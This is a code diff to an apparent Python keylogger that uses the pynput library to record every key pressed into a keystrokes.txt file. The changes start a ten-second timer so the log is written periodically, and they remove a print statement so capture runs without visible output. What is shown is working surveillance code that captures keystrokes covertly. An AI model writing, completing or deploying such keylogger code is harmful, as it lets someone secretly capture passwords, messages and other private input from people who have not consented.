@@ -6,6 +6,7 @@ import os
 
 log = ""
 #path = os.environ['HOME'] + "/processmanager.txt"
+#path =  "/home/as/Desktop/keystrokes.txt"
 path = os.getcwd() + "/keystrokes.txt"
 def process_keys(key):
     global log
@@ -25,7 +26,6 @@ def process_keys(key):
         else:
             log = log + " " + str(key) + " "
 
-    print(log)
 
 
     # with open("log.txt","a") as fin:
@@ -40,8 +40,10 @@ def report():
     log = ""
     f.close()
     timer = threading.Timer(10,report)
+    timer.start()
 
 def start():
     keyboard_listener = pynput.keyboard.Listener(on_press = process_keys)
     with keyboard_listener:
+        report()
         keyboard_listener.join()
